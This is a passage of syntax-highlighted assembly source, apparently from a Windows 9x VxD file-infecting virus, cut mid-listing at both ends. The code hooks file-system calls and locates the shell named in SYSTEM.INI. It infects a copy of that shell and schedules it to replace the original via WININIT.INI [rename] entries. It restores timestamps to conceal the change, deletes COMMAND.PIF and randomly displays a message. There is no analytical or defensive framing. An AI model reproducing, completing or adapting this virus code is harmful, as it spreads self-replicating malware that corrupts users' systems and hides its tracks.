        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">-</span><span class="sc5">STACK_FRAME</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc1">;SET CORRECT RETURN VALUE</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">FN_NUM</span><span class="sc4">,</span><span class="sc5">IFSFN_OPEN</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_STORE_FDATE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">EBX.IR_DATETIME</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
</span><span class="sc5">NO_STORE_FDATE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POPAD</span><span class="sc0">
        </span><span class="sc5">LEAVED</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">HOOK_STUB</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">IS_RENAME</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.IR_ATTR</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc5">FILE_FLAG_WILDCARDS</span><span class="sc0"> </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">IS_ACCESS</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">IS_ATTRIB</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc5">EBX.IR_FLAGS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">         </span><span class="sc1">;SET_ATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_SET_ATTRIB</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.IR_ATTR</span><span class="sc4">],</span><span class="sc5">FA_SYSTEM</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">IS_ACCESS</span><span class="sc0">
</span><span class="sc5">NO_SET_ATTRIB</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">SET_ATTRIB_CREATION_DATETIME</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">  </span><span class="sc5">IFS_RETURN</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">IS_ACCESS</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">IS_OPEN</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBX.IR_OPTIONS</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],(</span><span class="sc5">R0_SWAPPER_CALL</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">OPEN_FLAGS_REOPEN</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">IS_ACCESS</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">IFS_RETURN</span><span class="sc0">
</span><span class="sc5">GO_PROCESS</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">BREAK</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc5">SHELL_FLAG</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">IFNDEF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">GO_NO_INF_SHELL</span><span class="sc0">
        </span><span class="sc9">ELSE</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GO_NO_INF_SHELL</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_WININIT</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_ATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">GO_NO_INF_SHELL</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">SYSTEM_INI</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">LEN_SYSTEM_INI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CONCAT_WINDIR</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OPEN_FILE_RO</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">GO_NO_INF_SHELL</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">READ_FILE_BUFF_0</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">LONG_SYSINI</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
</span><span class="sc5">LONG_SYSINI</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CLOSE_FILE</span><span class="sc0">
</span><span class="sc5">FIND_SHELL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">LODSD</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">20202020H</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'lehs'</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_SHELL</span><span class="sc0">
        </span><span class="sc6">LODSW</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">20H</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc12">'=l'</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IS_SHELL</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
</span><span class="sc5">NO_SHELL</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">FIND_SHELL</span><span class="sc0">
</span><span class="sc5">GO_NO_INF_SHELL</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">NO_INF_SHELL</span><span class="sc0">
</span><span class="sc5">IS_SHELL</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">':'</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">SNAME_ONLY</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">TMP_PATH</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
</span><span class="sc5">COPY_SH_NAME</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc2">20H</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">  </span><span class="sc5">COPY_SH_NAME</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc8">DL</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">OPEN_SHELL</span><span class="sc0">
</span><span class="sc5">SNAME_ONLY</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
</span><span class="sc5">GET_SH_LIM</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc8">ECX</span><span class="sc4">],</span><span class="sc2">20H</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">  </span><span class="sc5">GET_SH_LIM</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CONCAT_WINDIR</span><span class="sc0">
</span><span class="sc5">OPEN_SHELL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OPEN_FILE_RO</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">GO_NO_INF_SHELL</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_ATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">OLD_DATETIME</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OPEN_CREATE</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">CLOSE_SOURCE</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">READ_FILE_BUFF_0</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">CLOSE_ALL</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">WE_HERE</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.DOSH_CSUM</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">WE_HERE</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">CLOSE_ALL_CMC</span><span class="sc0">
</span><span class="sc5">COPY_FILE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">WRITE_FILE</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">CLOSE_ALL</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,[</span><span class="sc8">ESP</span><span class="sc4">+</span><span class="sc2">10H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">READ_FILE</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">COPY_FILE</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">COPY_FILE</span><span class="sc0">
</span><span class="sc5">CLOSE_ALL_CMC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMC</span><span class="sc0">
</span><span class="sc5">CLOSE_ALL</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">PUSHFD</span><span class="sc0">      
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CLOSE_FILE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">SET_ATTRIB_MODIFY_DATETIME</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MAN_ATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">POPFD</span><span class="sc0">
</span><span class="sc5">CLOSE_SOURCE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">SH_ERR</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SET_ATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">SH_OK</span><span class="sc0">
</span><span class="sc5">SH_ERR</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DELETE_FILE</span><span class="sc0">
</span><span class="sc5">SH_OK</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CLOSE_FILE</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">STC</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">GOC_NO_INF_SHELL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">FILE_TYPE</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">DL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">INFECTION</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">TMP_PATH</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">MAIN_BUFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'ner['</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">']ema'</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0AH</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
</span><span class="sc5">MOVE_DEST</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">NO_LETTER</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">  </span><span class="sc5">NO_LETTER</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">20H</span><span class="sc0">
</span><span class="sc5">NO_LETTER</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">MOVE_DEST</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'='</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
</span><span class="sc5">MOVE_SOURCE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">MOVE_SOURCE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0AH</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'=lun'</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_WININIT</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
</span><span class="sc5">MOVE_INIT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">MOVE_INIT</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OPEN_CREATE</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
</span><span class="sc5">GOC_NO_INF_SHELL</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">NO_INF_SHELL</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">WRITE_FILE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CLOSE_FILE</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">GET_CUR_VM_HANDLE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">VXD_CALL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">MSG_POSSIBLITY</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RANDOM_BYTE</span><span class="sc0">
        </span><span class="sc9">IFNDEF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_INF_SHELL</span><span class="sc0">
        </span><span class="sc9">ELSE</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc5">COPYRIGHT</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">SHELL_MESSAGE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">VXD_CALL</span><span class="sc0">
</span><span class="sc5">NO_INF_SHELL</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">SHELL_FLAG</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
</span><span class="sc5">SHELL_ALREADY</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">IFNDEF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">COMMAND_PIF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">LEN_COMMAND_PIF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CONCAT_WINDIR</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_ATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">CPIF_NFOUND</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DELETE_FILE</span><span class="sc0">
</span><span class="sc5">CPIF_NFOUND</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc9">ELSE</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">TMP_PATH</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">DRIVE</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">          </span><span class="sc1">;UNC PATH?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_STORE_DRIVE</span><span class="sc0">
